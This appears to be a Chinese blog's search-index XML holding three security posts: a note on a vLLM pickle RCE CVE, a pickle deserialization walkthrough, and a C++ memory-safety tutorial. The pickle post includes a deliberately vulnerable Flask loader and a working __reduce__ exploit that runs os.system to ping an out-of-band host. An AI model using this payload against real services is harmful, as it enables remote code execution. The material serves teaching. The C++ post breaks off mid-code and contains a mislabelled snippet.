<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vllm大模型推理引擎</title>
      <link href="/2025/06/02/rce/"/>
      <url>/2025/06/02/rce/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CVE-2025-47277"><a href="#一、CVE-2025-47277" class="headerlink" title="一、CVE-2025-47277"></a>一、CVE-2025-47277</h1><p>近日 vllm的通信组件pyncclpipe 被爆出存在相关高危rce漏洞，cvss评分高达9.8分。<br><strong>vLLM</strong> 是一个基于 <strong>高效注意力算法（如 PagedAttention）</strong> 构建的高性能语言模型推理引擎。它专为大规模语言模型（LLM）的 <strong>服务化部署和推理加速</strong> 而设计。</p><h1 id="二、影响版本"><a href="#二、影响版本" class="headerlink" title="二、影响版本"></a>二、影响版本</h1><p>&#x3D;0.6.5,&lt;0.8.5  目前0.8.5版本已经修复相关漏洞</p><h1 id="三、原理"><a href="#三、原理" class="headerlink" title="三、原理"></a>三、原理</h1><p>目前官方poc 已经公布，原理就是pyncclpipe组件进行通信时，在将字节流数据进行反序列化时候采用的方式是pickle反序列化，因此如果pyncclpipe 组件接口暴露在外，就容易受到相关攻击，危害极大。</p><p>目前官方已经发布复现步骤 同时In_X 安全团队已经成功复现相关漏洞情况，已经集成相关poc，并针对相关漏洞在代码层面找到相关问题，具体细节可以@一起讨论.</p><p>具体复现细节，目前在另外一台机器上，不太方便。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pickle</title>
      <link href="/2025/06/01/pickle/"/>
      <url>/2025/06/01/pickle/</url>
      
        <content type="html"><![CDATA[<h1 id="一、pickle-反序列化"><a href="#一、pickle-反序列化" class="headerlink" title="一、pickle 反序列化"></a>一、pickle 反序列化</h1><h2 id="1-1-原理"><a href="#1-1-原理" class="headerlink" title="1.1 原理"></a>1.1 原理</h2><p>pickle 是相当于一个指令解释器，解析对应的opcode指令。因此其实python的序列化和反序列化机制更像是一个代码执行。<strong>pickle 的反序列化器是一个 opcode 解释器</strong>：它按顺序读取 opcode 并执行对应的动作。Pickle 的 opcode ≈ Python 对象操作的汇编代码，这也就是说我们的</p><ul><li><code>Python 字节码</code> 是 <strong>解释 Python 源代码用的“机器码”</strong></li></ul><ul><li><code>Pickle opcode</code> 是 <strong>解释 Python 对象结构和构造过程用的“脚本码”</strong></li></ul><p>类似汇编语言</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">c__builtin__\nos\nsystem\n   ← 加载 os.system</span><br><span class="line">(Sid hello.txt\n             ← 准备参数 (<span class="string">&quot;id hello.txt&quot;</span>,)</span><br><span class="line">t                            ← 创建 <span class="built_in">tuple</span></span><br><span class="line">R                            ← 调用函数 os.system(...)</span><br><span class="line">.                            ← 结束</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>Pickle 是一种<strong>带有执行语义的脚本格式</strong>。</p></li><li><p>它的 opcode 可以直接构造对象、调用函数（如 <code>os.system()</code>）。</p></li><li><p>所以，只要你给 Python 反序列化一个恶意构造的 pickle 数据，它就会<strong>自动“解释执行”这些指令</strong></p></li></ul><h2 id="1-2-rce"><a href="#1-2-rce" class="headerlink" title="1.2 rce"></a>1.2 rce</h2><p>因为 <code>pickle.loads()</code> 会<strong>直接执行传入数据中的指令（opcode）</strong>，而这些指令可以构造任意对象、调用任意函数、执行任意系统命令 —— 这就是完整的代码执行能力。</p><h4 id="pickle-dumps"><a href="#pickle-dumps" class="headerlink" title="pickle.dumps()"></a><code>pickle.dumps()</code></h4><ul><li><p>它 <strong>不是</strong> 把 Python 代码序列化成字节码（像 <code>.pyc</code> 文件那样）；</p></li><li><p>它是把一个 <strong>Python 对象（含其结构、数据、构造方法）</strong> 序列化成一种 <strong>pickle 指令流（opcode 流）</strong>；</p></li><li><p>这个 opcode 是 <code>pickle</code> 模块内部设计的一套“迷你语言”，能表示“如何构造这个对象”。</p></li></ul><h2 id="1-3-构造"><a href="#1-3-构造" class="headerlink" title="1.3 构造"></a>1.3 构造</h2><p> <code>__reduce__()</code> </p><p>在 Python 中，<code>pickle</code> 模块用来“序列化”和“反序列化”对象。<br>而当你 <strong>反序列化</strong> 一个对象时，<code>pickle</code> 必须知道：</p><blockquote><p>“我应该怎么重新构造这个对象？”</p></blockquote><p>这时候就靠对象的 <strong><code>__reduce__()</code> 方法</strong> 来告诉 <code>pickle</code> 如何“重建自己”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;id&quot;</span>,))  <span class="comment"># 任意系统命令</span></span><br></pre></td></tr></table></figure><p>只需要一个元组 带上函数名字 + 元组参数</p><h1 id="二、复现"><a href="#二、复现" class="headerlink" title="二、复现"></a>二、复现</h1><p>其实我感觉还是很简单的. 并且官方其实没有一些修复方式。这不算是一个漏洞，更多是算是一种特性。</p><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle_load&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line"></span><br><span class="line">    data = request.data</span><br><span class="line"></span><br><span class="line">    data=base64.b64decode(data)</span><br><span class="line"></span><br><span class="line">    obj = pickle.loads(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Loaded&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;ping  3.813902be86.ipv6.bypass.eu.org&quot;</span>,))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">a=pickle.dumps(Evil())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure><p>成功构造无回显rce</p><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20250601233737.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++内存机制和安全</title>
      <link href="/2025/04/05/c-%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E5%92%8C%E5%AE%89%E5%85%A8/"/>
      <url>/2025/04/05/c-%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E5%92%8C%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="1-动态分配内存"><a href="#1-动态分配内存" class="headerlink" title="1. 动态分配内存"></a>1. 动态分配内存</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span> <span class="comment">// For memset</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureBuffer</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">char</span> *m_data;  <span class="comment">// 指向动态分配的内存</span></span><br><span class="line">    <span class="type">size_t</span> m_size; <span class="comment">// 内存大小</span></span><br><span class="line">    <span class="built_in">SecureBuffer</span>(<span class="type">size_t</span> m_size)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//  分配内存 再赋值</span></span><br><span class="line">        m_data = <span class="keyword">new</span> <span class="type">char</span>[m_size];</span><br><span class="line">        std::<span class="built_in">memset</span>(m_data, <span class="number">0xCC</span>, m_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">SecureBuffer</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (m_data)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;memset 0&quot;</span>;</span><br><span class="line">            std::<span class="built_in">memset</span>(m_data, <span class="number">0x00</span>, m_size); <span class="comment">// 用 0x00 清空内存</span></span><br><span class="line">            <span class="keyword">delete</span>[] m_data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SecureBuffer *sec = <span class="keyword">new</span> <span class="built_in">SecureBuffer</span>(<span class="number">12</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;test&quot;</span> &lt;&lt; sec-&gt;m_data &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">delete</span> sec;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-问题描述"><a href="#2-问题描述" class="headerlink" title="2. 问题描述"></a>2. 问题描述</h4><h5 id="2-1-拷贝函数"><a href="#2-1-拷贝函数" class="headerlink" title="2.1 拷贝函数"></a>2.1 拷贝函数</h5><p>浅拷贝是两个对象但是共用一个内存 ，深拷贝是两个对象两个内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureBuffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">    <span class="type">char</span> *m_data;</span><br><span class="line">    <span class="type">size_t</span> m_size;</span><br><span class="line"></span><br><span class="line">    SecureBuffer(<span class="type">size_t</span> size) : m_size(size)</span><br><span class="line">    &#123;</span><br><span class="line">        m_data = new <span class="type">char</span>[m_size];</span><br><span class="line">        <span class="built_in">memset</span>(m_data, <span class="number">0xCC</span>, m_size);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor:  &quot;</span> &lt;&lt; m_size &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 浅拷贝构造函数</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        SecureBuffer(const SecureBuffer &amp;other) : m_data(other.m_data), m_size(other.m_size)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            std::cout &lt;&lt; &quot;浅拷贝构造函数被调用&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 深拷贝构造函数</span></span><br><span class="line"></span><br><span class="line">    SecureBuffer(<span class="type">const</span> SecureBuffer &amp;other) : m_size(other.m_size)</span><br><span class="line">    &#123;</span><br><span class="line">        m_data = new <span class="type">char</span>[m_size];</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">memcpy</span>(m_data, other.m_data, m_size);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;深拷贝构造函数被调用&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~SecureBuffer()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Destructor: &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (m_data)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memset</span>(m_data, <span class="number">0x00</span>, m_size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="title function_">printData</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;step)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; step &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Content: &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; min(m_size, (<span class="type">size_t</span>)<span class="number">4</span>); ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; setfill(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; setw(<span class="number">2</span>)</span><br><span class="line">                 &lt;&lt; static_cast&lt;<span class="type">unsigned</span>&gt;(static_cast&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;(m_data[i])) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    SecureBuffer *s1 = new SecureBuffer(<span class="number">12</span>);</span><br><span class="line">    SecureBuffer *s2 = new SecureBuffer(*s1);</span><br><span class="line">    s1-&gt;printData(<span class="string">&quot;拷贝之前s1的值&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s2-&gt;m_data, <span class="number">0x11</span>, s2-&gt;m_size);</span><br><span class="line">    s1-&gt;printData(<span class="string">&quot;拷贝之后s1的值&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-2-悬垂指针"><a href="#2-2-悬垂指针" class="headerlink" title="2.2 悬垂指针"></a>2.2 悬垂指针</h5><ol><li><p><strong>未定义行为</strong> ：</p><ul><li>访问已释放的内存会导致未定义行为，程序可能崩溃或输出不可预测的结果。</li></ul></li><li><p><strong>潜在的安全漏洞</strong> ：</p><ul><li>如果释放的内存被重新分配给其他对象，攻击者可能利用悬垂指针访问敏感数据。</li></ul></li><li><p><strong>调试困难</strong> ：</p><ul><li>悬垂指针的问题通常难以复现和调试，尤其是在大型项目中。</li></ul></li></ol><p>使用new 创建的 SecureBuffer 对象之后，显式调用析构函数销毁对象，但不置空指针，并继续通过该指针访问其成员函数，观察并输出悬垂指针带来的后果。 </p><p>就是销毁对象之后，之前指向对象的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureBuffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">    <span class="type">char</span> *m_data;</span><br><span class="line">    <span class="type">size_t</span> m_size;</span><br><span class="line"></span><br><span class="line">    SecureBuffer(<span class="type">size_t</span> size) : m_size(size)</span><br><span class="line">    &#123;</span><br><span class="line">        m_data = new <span class="type">char</span>[m_size];</span><br><span class="line">        <span class="built_in">memset</span>(m_data, <span class="number">0xCC</span>, m_size);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor:  &quot;</span> &lt;&lt; m_size &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 浅拷贝构造函数</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        SecureBuffer(const SecureBuffer &amp;other) : m_data(other.m_data), m_size(other.m_size)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            std::cout &lt;&lt; &quot;浅拷贝构造函数被调用&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 深拷贝构造函数</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        SecureBuffer(const SecureBuffer &amp;other) : m_size(other.m_size)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            m_data = new char[m_size];</span></span><br><span class="line"><span class="comment">            std::memcpy(m_data, other.m_data, m_size);</span></span><br><span class="line"><span class="comment">            std::cout &lt;&lt; &quot;深拷贝构造函数被调用&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    ~SecureBuffer()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Destructor: &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (m_data)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memset</span>(m_data, <span class="number">0x00</span>, m_size);</span><br><span class="line">            delete[] m_data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="title function_">printData</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;step)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; step &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Content: &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; min(m_size, (<span class="type">size_t</span>)<span class="number">4</span>); ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; setfill(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; setw(<span class="number">2</span>)</span><br><span class="line">                 &lt;&lt; static_cast&lt;<span class="type">unsigned</span>&gt;(static_cast&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;(m_data[i])) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_OBJECTS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        new SecureBuffer(<span class="number">1024</span>); <span class="comment">// 每个对象分配 1KB 内存（1024 字节）</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 输出内存泄漏提示</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;警告：程序未释放 &quot;</span> &lt;&lt; NUM_OBJECTS &lt;&lt; <span class="string">&quot; 个 SecureBuffer 对象的内存！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这将导致大约 &quot;</span> &lt;&lt; (NUM_OBJECTS * <span class="number">1024</span>) / (<span class="number">1024</span> * <span class="number">1024</span>) &lt;&lt; <span class="string">&quot; MB 的内存泄漏！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-3-析构函数的调用"><a href="#2-3-析构函数的调用" class="headerlink" title="2.3 析构函数的调用"></a>2.3 析构函数的调用</h5><ol><li><p><strong>动态分配的对象不会自动调用析构函数</strong> ： 如果你使用 <code>new</code> 动态创建对象（如 <code>new SecureBuffer(1024)</code>），这些对象的生命周期是由你手动管理的，它们不会在作用域结束时自动调用析构函数。</p></li><li><p><strong>只有栈上对象会在作用域结束时自动调用析构函数</strong> ： 如果你直接创建对象（如 <code>SecureBuffer buffer(1024);</code>），这些对象是分配在栈上的，当它们离开作用域时，析构函数会自动调用</p></li></ol><h2 id="3-相关解决机制"><a href="#3-相关解决机制" class="headerlink" title="3. 相关解决机制"></a>3. 相关解决机制</h2><h3 id="3-1-智能指针"><a href="#3-1-智能指针" class="headerlink" title="3.1 智能指针"></a>3.1 智能指针</h3><p>C++中的智能指针是用于管理动态内存的类模板，通过RAII（资源获取即初始化）机制自动管理资源的生命周期，避免内存泄漏和悬空指针问题。</p><ol><li>std::unique_ptr</li></ol><p>一个对象进行引用，只属于一个对象。其实智能指针就是一个类,只不过我们拿到类之后。进行对象构造。 不能被拷贝引用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="type">int</span>&gt; ptr1 = <span class="built_in">std</span>::make_unique&lt;<span class="type">int</span>&gt;(<span class="number">42</span>); <span class="comment">// 创建</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="type">int</span>&gt; ptr2 = <span class="built_in">std</span>::move(ptr1); <span class="comment">// 转移所有权</span></span><br><span class="line"><span class="comment">// ptr1现在为空，ptr2管理资源</span></span><br></pre></td></tr></table></figure><p>但是可以通过移动语义去进行放入vector </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">auto</span> ptr = <span class="built_in">std</span>::make_unique&lt;<span class="type">int</span>&gt;(<span class="number">42</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="type">int</span>&gt;&gt; vec;</span><br><span 